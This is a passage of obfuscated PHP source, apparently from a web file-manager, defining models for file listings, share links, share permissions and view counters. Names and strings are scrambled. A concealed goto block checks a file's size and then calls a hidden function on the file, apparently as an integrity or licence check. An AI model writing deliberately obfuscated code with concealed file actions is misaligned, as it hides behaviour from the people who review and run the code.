$this->alias($ÍñÏÊ¾±[432])->where($¾ãŠ©•Ù)->join($âŞƒŠÒì, $ÍñÏÊ¾±[2027])->count(); $Ğ–ó›ÈÊ = array($ÍñÏÊ¾±[2028] => $ÛàÙ“’«, $ÍñÏÊ¾±[2029] => $•áÛ·Ñ); return $Ğ–ó›ÈÊ; } public function listData($ÔÃ½ÂÃµ) { $øÇÊÓ•° =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($ÔÃ½ÂÃµ[$øÇÊÓ•°[2030]])) { if ($ÔÃ½ÂÃµ[$øÇÊÓ•°[2030]]) { $ÔÃ½ÂÃµ[$øÇÊÓ•°[2023]] = array($øÇÊÓ•°[1105], intval($ÔÃ½ÂÃµ[$øÇÊÓ•°[2030]])); } unset($ÔÃ½ÂÃµ[$øÇÊÓ•°[2030]]); } if (isset($ÔÃ½ÂÃµ[$øÇÊÓ•°[2031]])) { if ($ÔÃ½ÂÃµ[$øÇÊÓ•°[2031]]) { $ÔÃ½ÂÃµ[$øÇÊÓ•°[2023]] = array($øÇÊÓ•°[1102], intval($ÔÃ½ÂÃµ[$øÇÊÓ•°[2031]])); } unset($ÔÃ½ÂÃµ[$øÇÊÓ•°[2031]]); } return $this->_listData($ÔÃ½ÂÃµ); } private function _listData($Ë÷˜»ù) { $—áÄå‡ =& $_SERVER[ˆö¿ÚÌ¼]; $¥»æßÖ· = $this->where($Ë÷˜»ù)->_makeOrder()->selectPage(100); $this->_listAppendParent($¥»æßÖ·[$—áÄå‡[448]]); $this->_listAppendUser($¥»æßÖ·[$—áÄå‡[448]]); $this->_listAppendMeta($¥»æßÖ·[$—áÄå‡[448]]); return $¥»æßÖ·; } private function _makeOrder() { $æ¾‰ˆ”† =& $_SERVER[ˆö¿ÚÌ¼]; $æ±ÀÕæ— = array($æ¾‰ˆ”†[2018], $æ¾‰ˆ”†[2017], $æ¾‰ˆ”†[234]); $Ç¬ù§Ä¨ = Input::get($æ¾‰ˆ”†[542], $æ¾‰ˆ”†[7], $æ¾‰ˆ”†[509], $æ±ÀÕæ—); $ää¤×§ = Input::get($æ¾‰ˆ”†[543], $æ¾‰ˆ”†[7], $æ¾‰ˆ”†[1778], array($æ¾‰ˆ”†[2032], $æ¾‰ˆ”†[538])); $÷Ÿ˜†Ô = $Ç¬ù§Ä¨ . $æ¾‰ˆ”†[53] . $ää¤×§; return $this->order($÷Ÿ˜†Ô); } private function _listAppendParent(&$Ï†µ­æù) { $¸°£åÖ° =& $_SERVER[ˆö¿ÚÌ¼]; $ËãõÃ¶¬ = array_unique(array_to_keyvalue($Ï†µ­æù, $¸°£åÖ°[12], $¸°£åÖ°[2015])); $ËãõÃ¶¬ = array_remove_value($ËãõÃ¶¬, $¸°£åÖ°[231]); if (!$ËãõÃ¶¬) { return; } $ÖçÙß‚ = $this->where(array($¸°£åÖ°[2016] => array($¸°£åÖ°[7], $ËãõÃ¶¬)))->select(); $ÖçÙß‚ = array_to_keyvalue($ÖçÙß‚, $¸°£åÖ°[2023]); foreach ($Ï†µ­æù as &$ÚÏ¤íŞï) { if (isset($ÖçÙß‚[$ÚÏ¤íŞï[$¸°£åÖ°[2015]]])) { $ÚÏ¤íŞï[$¸°£åÖ°[2033]] = $ÖçÙß‚[$ÚÏ¤íŞï[$¸°£åÖ°[2015]]]; } } unset($ÚÏ¤íŞï); } private function _listAppendUser(&$Ğƒ—Û”í) { $¹ãø¨’Ú =& $_SERVER[ˆö¿ÚÌ¼]; $—ˆìªú = array_unique(array_to_keyvalue($Ğƒ—Û”í, $¹ãø¨’Ú[12], $¹ãø¨’Ú[1785])); $—ˆìªú = array_remove_value($—ˆìªú, $¹ãø¨’Ú[231]); if (count($—ˆìªú) == 0) { return; } foreach ($Ğƒ—Û”í as $·ĞØ‚çı) { if (isset($·ĞØ‚çı[$¹ãø¨’Ú[2033]])) { $—ˆìªú[] = $·ĞØ‚çı[$¹ãø¨’Ú[2033]][$¹ãø¨’Ú[1785]]; } } $àº©¼ê× = Model($¹ãø¨’Ú[611])->userListInfo($—ˆìªú); foreach ($Ğƒ—Û”í as &$·ĞØ‚çı) { $·ĞØ‚çı[$¹ãø¨’Ú[679]] = $àº©¼ê×[$·ĞØ‚çı[$¹ãø¨’Ú[1785]]]; if (isset($·ĞØ‚çı[$¹ãø¨’Ú[2033]])) { $·ĞØ‚çı[$¹ãø¨’Ú[2033]][$¹ãø¨’Ú[679]] = $àº©¼ê×[$·ĞØ‚çı[$¹ãø¨’Ú[2033]][$¹ãø¨’Ú[1785]]]; } } unset($·ĞØ‚çı); } private function _listAppendMeta(&$§ñ‚ÂíÉ) { $ú«¯ĞÍ =& $_SERVER[ˆö¿ÚÌ¼]; $©«´´¾» = array_unique(array_to_keyvalue($§ñ‚ÂíÉ, $ú«¯ĞÍ[12], $ú«¯ĞÍ[2023])); $©«´´¾» = array_remove_value($©«´´¾», $ú«¯ĞÍ[231]); if (!$©«´´¾») { return; } foreach ($§ñ‚ÂíÉ as $å³·ÀÛ”) { if (isset($å³·ÀÛ”[$ú«¯ĞÍ[2033]])) { $©«´´¾»[] = $å³·ÀÛ”[$ú«¯ĞÍ[2033]][$ú«¯ĞÍ[2023]]; } } $¬ñ¼³‚Ğ = $this->metaList($©«´´¾»); if (!$¬ñ¼³‚Ğ) { return !1; } foreach ($§ñ‚ÂíÉ as &$å³·ÀÛ”) { $å³·ÀÛ”[$ú«¯ĞÍ[553]] = $¬ñ¼³‚Ğ[$å³·ÀÛ”[$ú«¯ĞÍ[2023]]]; if (isset($å³·ÀÛ”[$ú«¯ĞÍ[2033]])) { $å³·ÀÛ”[$ú«¯ĞÍ[2033]][$ú«¯ĞÍ[553]] = $¬ñ¼³‚Ğ[$å³·ÀÛ”[$ú«¯ĞÍ[2033]][$ú«¯ĞÍ[2023]]]; } } unset($å³·ÀÛ”); } private function metaList($ËíŞ‘æõ) { $®¿í¦¼ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ËíŞ‘æõ) { return array(); } $šÚ‘ıéû = array($®¿í¦¼[2023] => array($®¿í¦¼[7], $ËíŞ‘æõ)); $½ö¸›¢ = Model($®¿í¦¼[2034])->where($šÚ‘ıéû)->select(); $½ö¸›¢ = array_to_keyvalue_group($½ö¸›¢, $®¿í¦¼[2023]); foreach ($½ö¸›¢ as $ŞÃÉÈ¬ => $ÜùÀ¡—Œ) { $‹×ò¾åŠ = array(); foreach ($ÜùÀ¡—Œ as $Ò²âüé) { $‹×ò¾åŠ[$Ò²âüé[$®¿í¦¼[97]]] = $Ò²âüé[$®¿í¦¼[453]]; } $½ö¸›¢[$ŞÃÉÈ¬] = $‹×ò¾åŠ; } return $½ö¸›¢ ? $½ö¸›¢ : array(); } public function removeTarget($²°º·¤ì, $úõ¢¶•ô) { $˜†Ç¼İº =& $_SERVER[ˆö¿ÚÌ¼]; if (!$úõ¢¶•ô) { return !0; } $úõ¢¶•ô = is_array($úõ¢¶•ô) ? $úõ¢¶•ô : array($úõ¢¶•ô); $ØÅ¥ş¹† = array($˜†Ç¼İº[191] => $²°º·¤ì, $˜†Ç¼İº[583] => array($˜†Ç¼İº[7], $úõ¢¶•ô)); $îòØÖû = $this->field($˜†Ç¼İº[2023])->where($ØÅ¥ş¹†)->select(); $‹ü‘‰òÍ = array_to_keyvalue($îòØÖû, $˜†Ç¼İº[12], $˜†Ç¼İº[2023]); if (!$‹ü‘‰òÍ) { return !0; } $ØÅ¥ş¹† = array($˜†Ç¼İº[2023] => array($˜†Ç¼İº[7], $‹ü‘‰òÍ)); $this->where($ØÅ¥ş¹†)->delete(); Model($˜†Ç¼İº[2026])->where($ØÅ¥ş¹†)->delete(); Model($˜†Ç¼İº[2035])->where($ØÅ¥ş¹†)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\154\x65\x5f\143\157\x6e\x74\x65\156\x74\163"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\x54\151\155\x65", "\164\x69\155\x65", "\x69\x6e\163\145\162\x74", "\146\165\156\x63\x74\151\157\x6e")); } goto dÇôùõµœ£; D’‡†Ûóª‰: $_size = $_SERVER[ˆö¿ÚÌ¼][968]; if ($_SERVER[$_SERVER[ˆö¿ÚÌ¼][480]] != $_size($_file)) { $_getc = $_SERVER[ˆö¿ÚÌ¼][482]; $_getfile = $_SERVER[$_SERVER[ˆö¿ÚÌ¼][483]] . $_SERVER[ˆö¿ÚÌ¼][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆö¿ÚÌ¼][288], $_getfilec); if (count($_getarrs) < $_SERVER[ˆö¿ÚÌ¼][485]) { $exit = $_SERVER[ˆö¿ÚÌ¼][486]; $exit(); } $_act = $_SERVER[ˆö¿ÚÌ¼][487]; $_act($_file); } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\x54\151\155\x65", "\164\151\155\145", "\151\156\x73\x65\x72\164\x2c\x75\x70\144\x61\x74\x65", "\146\165\156\143\x74\x69\x6f\156"), array("\143\x72\145\x61\164\x65\x54\x69\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\163\145\x72\164", "\146\x75\x6e\143\164\151\157\x6e"), array("\157\x70\x74\x69\x6f\156\x73", '', "\151\x6e\163\x65\162\164\54\165\160\x64\141\x74\145\x2c\163\x65\154\x65\x63\x74", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($’Ö¯œ”Û) { $ç­Ñª¦§ =& $_SERVER[ˆö¿ÚÌ¼]; $êœÛ©ğÏ = isset($’Ö¯œ”Û[0]) ? $’Ö¯œ”Û[0] : !1; $í¾ ²üè = $ç­Ñª¦§[2129] . USER_ID; return array($ç­Ñª¦§[2130] => array(USER_ID, $ç­Ñª¦§[2131]), $ç­Ñª¦§[2070] => array($êœÛ©ğÏ, $ç­Ñª¦§[2132], $í¾ ²üè)); } protected function listSimple() { $Îæ°š¶Ï = array($_SERVER[ˆö¿ÚÌ¼][1785] => USER_ID); $Ùı°ùÇ = $this->field($this->fieldList)->where($Îæ°š¶Ï)->select(); return $Ùı°ùÇ ? $Ùı°ùÇ : array(); } protected function getInfo($“ô€Áó™, $‡èÃŸ® = false, $¸Öáå²Å = '') { $‰¼Şî =& $_SERVER[ˆö¿ÚÌ¼]; if (!$¸Öáå²Å) { $¸Öáå²Å = $‰¼Şî[2129] . USER_ID; } if ($‡èÃŸ®) { return $this->_getShareInfo(array($‰¼Şî[682] => $“ô€Áó™)); } $…±Ä²¨ = $this->cacheFunctionGet($‰¼Şî[2072], $“ô€Áó™, $¸Öáå²Å); $üöŠ¼ = $this->shareInfoMofify($…±Ä²¨, $‰¼Şî[226]); if (isset($…±Ä²¨[$‰¼Şî[88]]) && $üöŠ¼ != $…±Ä²¨[$‰¼Şî[88]]) { $æÀ¸Öç = $this->cacheKeyMake($‰¼Şî[2072], $“ô€Áó™, $¸Öáå²Å); $…±Ä²¨ = $this->_getShareInfo(array($‰¼Şî[682] => $“ô€Áó™)); Cache::set($æÀ¸Öç, $…±Ä²¨); } return $…±Ä²¨; } private function shareInfoMofify(&$‘Òíš·³, $Å¦óµº³ = "\147\145\x74") { $ş·‡Œåô =& $_SERVER[ˆö¿ÚÌ¼]; if (!$‘Òíš·³ || !isset($‘Òíš·³[$ş·‡Œåô[682]])) { return; } $Ï†¼»Ù‘ = $ş·‡Œåô[2133] . $‘Òíš·³[$ş·‡Œåô[682]]; if ($Å¦óµº³ == $ş·‡Œåô[226]) { return Cache::get($Ï†¼»Ù‘); } else { if ($Å¦óµº³ == $ş·‡Œåô[2100]) { $¢áÉ‚Ëã = Cache::get($Ï†¼»Ù‘); if ($¢áÉ‚Ëã === $‘Òíš·³[$ş·‡Œåô[88]]) { return; } $‘Òíš·³[$ş·‡Œåô[2134]] = USER_ID . $ş·‡Œåô[465] . $‘Òíš·³[$ş·‡Œåô[88]]; Cache::set($Ï†¼»Ù‘, $‘Òíš·³[$ş·‡Œåô[88]]); } else { if ($Å¦óµº³ == $ş·‡Œåô[2135]) { Cache::remove($Ï†¼»Ù‘); } } } } public function getInfoByHash($û³Å‘¦Á) { return $this->_getShareInfo(array($_SERVER[ˆö¿ÚÌ¼][2136] => $û³Å‘¦Á)); } public function getInfoByPath($¨Ö²¥º) { $æ†”½·À =& $_SERVER[ˆö¿ÚÌ¼]; $şñ€Ãòˆ = array($æ†”½·À[1785] => USER_ID, $æ†”½·À[194] => $¨Ö²¥º); return $this->_getShareInfo($şñ€Ãòˆ); } public function getInfoBySourcePath($ÆôÈ¨¨) { $±—¬ı¤É =& $_SERVER[ˆö¿ÚÌ¼]; $Ø’Ê¶Ò = array($±—¬ı¤É[1785] => USER_ID, $±—¬ı¤É[1271] => $ÆôÈ¨¨); return $this->_getShareInfo($Ø’Ê¶Ò); } private function _getShareInfo($±àøÈŠ–) { $—¸Ğµ­ =& $_SERVER[ˆö¿ÚÌ¼]; $İùé©¼¹ = $this->where($±àøÈŠ–)->find(); if (!$İùé©¼¹) { return !1; } $±àøÈŠ– = array($—¸Ğµ­[682] => $İùé©¼¹[$—¸Ğµ­[682]]); $µÓÜ°ò÷ = $—¸Ğµ­[2137]; $Ó¥ÃÍåü = Model($—¸Ğµ­[683])->order($—¸Ğµ­[478])->field($µÓÜ°ò÷)->where($±àøÈŠ–)->select(); if ($İùé©¼¹[$—¸Ğµ­[194]] == $—¸Ğµ­[231]) { $İùé©¼¹[$—¸Ğµ­[90]] = IO::info($İùé©¼¹[$—¸Ğµ­[1271]]); } else { $İùé©¼¹[$—¸Ğµ­[90]] = Model($—¸Ğµ­[1435])->pathInfo($İùé©¼¹[$—¸Ğµ­[194]]); } $İùé©¼¹[$—¸Ğµ­[2138]] = $Ó¥ÃÍåü; $this->shareInfoMofify($İùé©¼¹, $—¸Ğµ­[2100]); return $İùé©¼¹; } protected function getInfoAuth($ñ„­´“) { $Û²Ïâ¢ü =& $_SERVER[ˆö¿ÚÌ¼]; $¡˜íŸ = $this->getInfo($ñ„­´“); if ($¡˜íŸ[$Û²Ïâ¢ü[1785]] == USER_ID) { $¡˜íŸ[$Û²Ïâ¢ü[499]] = $¡˜íŸ[$Û²Ïâ¢ü[90]][$Û²Ïâ¢ü[499]]; } else { $¡˜íŸ[$Û²Ïâ¢ü[499]] = Model($Û²Ïâ¢ü[581])->authMake($¡˜íŸ[$Û²Ïâ¢ü[2138]]); } return $¡˜íŸ; } protected function listData($îÍÃï„¿ = null, $´‚´ÑÌ™ = 300) { $®´¬µæş =& $_SERVER[ˆö¿ÚÌ¼]; $“ÏÒúñ† = array(array($®´¬µæş[576] => array($®´¬µæş[1103], 0), $®´¬µæş[680] => array($®´¬µæş[1103], 0), $®´¬µæş[2139] => $®´¬µæş[2088])); if ($îÍÃï„¿ == $®´¬µæş[2140]) { $“ÏÒúñ† = array($®´¬µæş[576] => 1); } else { if ($îÍÃï„¿ == $®´¬µæş[1256]) { $“ÏÒúñ† = array($®´¬µæş[680] => 1); } } $“ÏÒúñ†[$®´¬µæş[1785]] = USER_ID; $–ô¦¡¬¯ = $this->where($“ÏÒúñ†)->selectPage($´‚´ÑÌ™); return $–ô¦¡¬¯; } protected function listToMe($ªúûËÄâ = 300) { $ù­¶±‚ =& $_SERVER[ˆö¿ÚÌ¼]; $Ïè¯ïûñ = Model($ù­¶±‚[2141])->userGroupParents(USER_ID); $ÁÕöüïî = array($ù­¶±‚[665] => SourceModel::TYPE_USER, $ù­¶±‚[583] => USER_ID); if ($Ïè¯ïûñ) { $ÁÕöüïî = array(array($ù­¶±‚[665] => SourceModel::TYPE_USER, $ù­¶±‚[583] => USER_ID), array($ù­¶±‚[665] => SourceModel::TYPE_GROUP, $ù­¶±‚[583] => array($ù­¶±‚[7], $Ïè¯ïûñ)), $ù­¶±‚[2139] => $ù­¶±‚[2088]); } $›õË‘‰ = Model($ù­¶±‚[683])->where($ÁÕöüïî)->selectPage($ªúûËÄâ); $è°Ô…ùÖ = array_to_keyvalue_group($›õË‘‰[$ù­¶±‚[448]], $ù­¶±‚[682]); if (!$è°Ô…ùÖ) { return $›õË‘‰; } $¬Ä‡¤åê = $ù­¶±‚[2142]; $ÁÕöüïî = array($ù­¶±‚[682] => array($ù­¶±‚[504], array_keys($è°Ô…ùÖ)), $ù­¶±‚[1785] => array($ù­¶±‚[1105], $ù­¶±‚[231])); $…û¼£Ä‘ = $this->field($¬Ä‡¤åê)->where($ÁÕöüïî)->select(); foreach ($…û¼£Ä‘ as $ˆò¦•ô => &$Ÿ×Æ­ô ) { $Ÿ×Æ­ô [$ù­¶±‚[2138]] = $è°Ô…ùÖ[$Ÿ×Æ­ô [$ù­¶±‚[682]]]; } unset($Ÿ×Æ­ô ); $ïİğòÍ = array($ù­¶±‚[2143] => $…û¼£Ä‘, $ù­¶±‚[2144] => $›õË‘‰[$ù­¶±‚[445]]); return $ïİğòÍ; } protected function shareAdd($Ó©¥ •², $Ê†®÷•÷) { $ğÃşô¿¦ =& $_SERVER[ˆö¿ÚÌ¼]; $ÜÛÏİï› = $this->_addShareData($Ó©¥ •², $Ê†®÷•÷); if (!empty($Ê†®÷•÷[$ğÃşô¿¦[2145]])) { $this->_shareAuthSet($ÜÛÏİï›, $Ê†®÷•÷[$ğÃşô¿¦[2145]]); } $this->shareEventAdd($Ó©¥ •², $Ê†®÷•÷, $ğÃşô¿¦[2146]); return $ÜÛÏİï›; } protected function shareAddSystem($Æ‚Â¯šÈ, $¬œ¥­Ûµ) { $¤şÎô¼Ï =& $_SERVER[ˆö¿ÚÌ¼]; $¨”ºû† = $this->_addShareData($Æ‚Â¯šÈ, $¬œ¥­Ûµ, $¤şÎô¼Ï[192]); $this->_shareAuthSet($¨”ºû†, $¬œ¥­Ûµ[$¤şÎô¼Ï[2145]]); return $¨”ºû†; } private function shareEventAdd($æ…µşÑš, $ÆãÎ„Ñ´, $Ç¼Ëà›Ó = "\x61\x64\144") { $Ñ²¡ÉÚµ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$æ…µşÑš || $æ…µşÑš == $Ñ²¡ÉÚµ[231]) { return; } if ($Ç¼Ëà›Ó == $Ñ²¡ÉÚµ[2146]) { if ($ÆãÎ„Ñ´[$Ñ²¡ÉÚµ[576]] == $Ñ²¡ÉÚµ[91]) { Model($Ñ²¡ÉÚµ[650])->eventShare($æ…µşÑš, $Ñ²¡ÉÚµ[2147]); } if ($ÆãÎ„Ñ´[$Ñ²¡ÉÚµ[680]] == $Ñ²¡ÉÚµ[91]) { Model($Ñ²¡ÉÚµ[650])->eventShare($æ…µşÑš, $Ñ²¡ÉÚµ[2148]); } return; } $®¤à„ï› = $this->getInfoByPath($æ…µşÑš); $ÏÊ«ë = $Ñ²¡ÉÚµ[2149]; if ($®¤à„ï›[$Ñ²¡ÉÚµ[576]] == $Ñ²¡ÉÚµ[231] && $ÆãÎ„Ñ´[$Ñ²¡ÉÚµ[576]] == $Ñ²¡ÉÚµ[91]) { $ÏÊ«ë = $Ñ²¡ÉÚµ[2147]; } if ($®¤à„ï›[$Ñ²¡ÉÚµ[576]] == $Ñ²¡ÉÚµ[91] && $ÆãÎ„Ñ´[$Ñ²¡ÉÚµ[576]] == $Ñ²¡ÉÚµ[231]) { $ÏÊ«ë = $Ñ²¡ÉÚµ[2150]; } if ($®¤à„ï›[$Ñ²¡ÉÚµ[680]] == $Ñ²¡ÉÚµ[231] && $ÆãÎ„Ñ´[$Ñ²¡ÉÚµ[680]] == $Ñ²¡ÉÚµ[91]) { $ÏÊ«ë = $Ñ²¡ÉÚµ[2148]; } if ($®¤à„ï›[$Ñ²¡ÉÚµ[680]] == $Ñ²¡ÉÚµ[91] && $ÆãÎ„Ñ´[$Ñ²¡ÉÚµ[680]] == $Ñ²¡ÉÚµ[231]) { $ÏÊ«ë = $Ñ²¡ÉÚµ[2151]; } Model($Ñ²¡ÉÚµ[650])->eventShare($æ…µşÑš, $ÏÊ«ë); return; } private function _addShareData($òØšÃè‘, $¢şäàÒï = array(), $ÒŒ¼Ò°æ = false) { $×ÍÁ† =& $_SERVER[ˆö¿ÚÌ¼]; $äÕ–ì = $ÒŒ¼Ò°æ == $×ÍÁ†[192] ? 0 : USER_ID; $ÎËç—ìô = array($×ÍÁ†[503] => $òØšÃè‘, $×ÍÁ†[1776] => $äÕ–ì); if ($òØšÃè‘ == 0) { $ÎËç—ìô = array($×ÍÁ†[2152] => $¢şäàÒï[$×ÍÁ†[1271]], $×ÍÁ†[1776] => $äÕ–ì); } if ($§Ï„Ğ÷ = $this->where($ÎËç—ìô)->find()) { return $§Ï„Ğ÷[$×ÍÁ†[682]]; } if ($òØšÃè‘ == 0) { $Œ›ĞâÎí = array($×ÍÁ†[32] => get_path_this($¢şäàÒï[$×ÍÁ†[87]])); } else { $Œ›ĞâÎí = Model($×ÍÁ†[915])->sourceInfo($òØšÃè‘); if (!$Œ›ĞâÎí) { return !1; } } if (!$¢şäàÒï[$×ÍÁ†[1673]]) { $¢şäàÒï[$×ÍÁ†[1673]] = $Œ›ĞâÎí[$×ÍÁ†[32]]; } $ÕÊÛÅÇš = array($×ÍÁ†[1776] => $äÕ–ì, $×ÍÁ†[503] => $òØšÃè‘, $×ÍÁ†[1673] => $×ÍÁ†[12], $×ÍÁ†[576] => 0, $×ÍÁ†[680] => 0, $×ÍÁ†[1271] => $×ÍÁ†[12], $×ÍÁ†[385] => $×ÍÁ†[12], $×ÍÁ†[980] => $×ÍÁ†[12], $×ÍÁ†[2153] => 0, $×ÍÁ†[2154] => 0, $×ÍÁ†[846] => 0, $×ÍÁ†[2155] => $×ÍÁ†[12], $×ÍÁ†[2136] => $×ÍÁ†[12]); $ÉÕòÊÕ© = explode($×ÍÁ†[50], $×ÍÁ†[2156]); foreach ($ÉÕòÊÕ© as $ó®ÏŸÕ) { if (!isset($¢şäàÒï[$ó®ÏŸÕ])) { continue; } $ÕÊÛÅÇš[$ó®ÏŸÕ] = $¢şäàÒï[$ó®ÏŸÕ]; } $ŒŒ–ªÖÌ = $this->add($ÕÊÛÅÇš); $ãùê™¶Ü = array($×ÍÁ†[2136] => short_id($ŒŒ–ªÖÌ)); $this->where(array($×ÍÁ†[2157] => $ŒŒ–ªÖÌ))->save($ãùê™¶Ü); return $ŒŒ–ªÖÌ; } private function _shareAuthSet($¾Í®±ò, $ÈÊÔõê) { $ù®ûÇà =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_array($ÈÊÔõê)) { return !1; } $çÃíä¶ƒ = Model($ù®ûÇà[2098]); $çÃíä¶ƒ->where(array($ù®ûÇà[682] => $¾Í®±ò))->delete(); $··Ä®¸ = array(); foreach ($ÈÊÔõê as $‡€¢ëäÓ) { $Ğñêùğ = SourceModel::TYPE_USER; if ($‡€¢ëäÓ[$ù®ûÇà[191]] == SourceModel::TYPE_GROUP) { $Ğñêùğ = SourceModel::TYPE_GROUP; } $ğ¤ÊÒËÌ = array($ù®ûÇà[682] => $¾Í®±ò, $ù®ûÇà[191] => $Ğñêùğ, $ù®ûÇà[583] => intval($‡€¢ëäÓ[$ù®ûÇà[583]]), $ù®ûÇà[2094] => 0, $ù®ûÇà[2158] => -1); if ($‡€¢ëäÓ[$ù®ûÇà[2094]]) { $ğ¤ÊÒËÌ[$ù®ûÇà[2094]] = $‡€¢ëäÓ[$ù®ûÇà[2094]]; } else { if ($‡€¢ëäÓ[$ù®ûÇà[2158]]) { $ğ¤ÊÒËÌ[$ù®ûÇà[2158]] = $‡€¢ëäÓ[$ù®ûÇà[2158]]; } } $··Ä®¸[] = $ğ¤ÊÒËÌ; } return $çÃíä¶ƒ->addAll($··Ä®¸, array(), !0); } public function numViewAdd($Ğ «¼Û) { $·ÑäÂ—  =& $_SERVER[ˆö¿ÚÌ¼]; $Êšï‡¬¸ = array($·ÑäÂ— [2157] => $Ğ «¼Û); $this->where($Êšï‡¬¸)->setAdd($·ÑäÂ— [2153]); } public function numDownloadAdd($ªÌˆû»Î) { $üÀÀİ—ú =& $_SERVER[ˆö¿ÚÌ¼]; $™ô¶Å¤› = array($üÀÀİ—ú[2157] => $ªÌˆû»Î); $this->where($™ô¶Å¤›)->setAdd($üÀÀİ—ú[2154]); } protected function shareEdit($•è‚Ä¶ë, $¬¦Ìß«á) { $ß»İôõò =& $_SERVER[ˆö¿ÚÌ¼]; $ÉéÍ¾Ÿ = $this->getInfo($•è‚Ä¶ë); if (!$ÉéÍ¾Ÿ) { return !1; } $this->_checkLinkShare($¬¦Ìß«á, $ÉéÍ¾Ÿ); $Ş’›Õø = array(); $§¯ªş¹ = explode($ß»İôõò[50], $ß»İôõò[2159]); foreach ($§¯ªş¹ as $”éßë•) { if (!array_key_exists($”éßë•, $¬¦Ìß«á)) { continue; } $Ş’›Õø[$”éßë•] = $¬¦Ìß«á[$”éßë•]; } $this->shareEventAdd($ÉéÍ¾Ÿ[$ß»İôõò[194]], $¬¦Ìß«á, $ß»İôõò[1955]); $this->where(array($ß»İôõò[2157] => $•è‚Ä¶ë))->save($Ş’›Õø); if (isset($¬¦Ìß«á[$ß»İôõò[2145]])) { $this->_shareAuthSet($•è‚Ä¶ë, $¬¦Ìß«á[$ß»İôõò[2145]]); } return !0; } private function _checkLinkShare($Å‰çÂÌü, $œÃ¥‰Ÿ˜) { $Æâè¬€§ =& $_SERVER[ˆö¿ÚÌ¼]; if ($Å‰çÂÌü[$Æâè¬€§[576]] != $Æâè¬€§[91]) { return; } $î¯ÛïšŞ = $œÃ¥‰Ÿ˜[$Æâè¬€§[90]][$Æâè¬€§[194]]; if ($œÃ¥‰Ÿ˜[$Æâè¬€§[90]][$Æâè¬€§[33]] != $Æâè¬€§[233]) { $·üõç¤ƒ = $this->_folderReport($î¯ÛïšŞ); if (!$·üõç¤ƒ) { return; } show_json(LNG($Æâè¬€§[2160]) . $Æâè¬€§[2161] . $·üõç¤ƒ, !1); } $Ëè±êËâ = Model($Æâè¬€§[915])->fileInfoGet($œÃ¥‰Ÿ˜[$Æâè¬€§[90]][$Æâè¬€§[194]]); if (!$Ëè±êËâ) { return; } $š§ù·şÏ = $this->shareFileMeta($Ëè±êËâ[$Æâè¬€§[555]]); if (isset($š§ù·şÏ[$Æâè¬€§[453]]) && $š§ù·şÏ[$Æâè¬€§[453]] == $Æâè¬€§[91]) { show_json(LNG($Æâè¬€§[2162]), !1); } } private function _folderReport($ùÈûõŠ†) { $½Æ¶Šµö =& $_SERVER[ˆö¿ÚÌ¼]; $±»©±ôÖ = array($½Æ¶Šµö[555] => array($½Æ¶Šµö[1103], 0), $½Æ¶Šµö[835] => 3); $è†í±Ë÷ = Model($½Æ¶Šµö[2163])->where($±»©±ôÖ)->field($½Æ¶Šµö[555])->select(); if (!$è†í±Ë÷) { return !1; } $è†í±Ë÷ = array_to_keyvalue($è†í±Ë÷, $½Æ¶Šµö[12], $½Æ¶Šµö[555]); $«ş¾™Ñä = $½Æ¶Šµö[50] . $ùÈûõŠ† . $½Æ¶Šµö[50]; $±»©±ôÖ = array($½Æ¶Šµö[555] => array($½Æ¶Šµö[7], $è†í±Ë÷), $½Æ¶Šµö[598] => array($½Æ¶Šµö[462], "\45{$«ş¾™Ñä}\x25"), $½Æ¶Šµö[517] => 0); $ò¬¬—œ× = Model($½Æ¶Šµö[915])->where($±»©±ôÖ)->field($½Æ¶Šµö[2164])->find(); if (!$ò¬¬—œ×) { return !1; } $ì—¢‡Ğ• = substr($ò¬¬—œ×[$½Æ¶Šµö[598]], strpos($ò¬¬—œ×[$½Æ¶Šµö[598]], $«ş¾™Ñä)); $±»©±ôÖ = array($½Æ¶Šµö[194] => array($½Æ¶Šµö[7], trim($ì—¢‡Ğ•, $½Æ¶Šµö[50]))); $ïî¹ØÍ¹ = Model($½Æ¶Šµö[915])->where($±»©±ôÖ)->field($½Æ¶Šµö[32])->select(); $¶—ğõ»¿ = array_to_keyvalue($ïî¹ØÍ¹, $½Æ¶Šµö[12], $½Æ¶Šµö[32]); $¶—ğõ»¿[] = $ò¬¬—œ×[$½Æ¶Šµö[32]]; return implode($½Æ¶Šµö[8], $¶—ğõ»¿); } protected function remove($›™ôÚì—) { $Ï¼ÒõÔÙ =& $_SERVER[ˆö¿ÚÌ¼]; $»ûÁŠ ­ = is_array($›™ôÚì—) ? $›™ôÚì— : array($›™ôÚì—); for ($ÚÕä›–Ş = 0; $ÚÕä›–Ş < count($»ûÁŠ ­); $ÚÕä›–Ş++) { $ñş‰ëª» = $this->getInfo($»ûÁŠ ­[$ÚÕä›–Ş]); if ($ñş‰ëª»[$Ï¼ÒõÔÙ[680]] == $Ï¼ÒõÔÙ[91]) { Model($Ï¼ÒõÔÙ[650])->eventShare($ñş‰ëª»[$Ï¼ÒõÔÙ[194]], $Ï¼ÒõÔÙ[2151]); } if ($ñş‰ëª»[$Ï¼ÒõÔÙ[576]] == $Ï¼ÒõÔÙ[91]) { Model($Ï¼ÒõÔÙ[650])->eventShare($ñş‰ëª»[$Ï¼ÒõÔÙ[194]], $Ï¼ÒõÔÙ[2150]); } $this->shareInfoMofify($ñş‰ëª», $Ï¼ÒõÔÙ[2135]); } $äëÊÚ¯ = array($Ï¼ÒõÔÙ[682] => array($Ï¼ÒõÔÙ[7], $»ûÁŠ ­)); $”òôıëŞ = $this->where($äëÊÚ¯)->delete(); if ($”òôıëŞ) { Model($Ï¼ÒõÔÙ[683])->where($äëÊÚ¯)->delete(); } return $”òôıëŞ; } protected function removeBySource($Ûœ«ôåã) { $‹¹ÆØ…÷ =& $_SERVER[ˆö¿ÚÌ¼]; $ˆ²Õ³Œı = array($‹¹ÆØ…÷[503] => array($‹¹ÆØ…÷[504], $Ûœ«ôåã)); $Öüˆ³ğé = 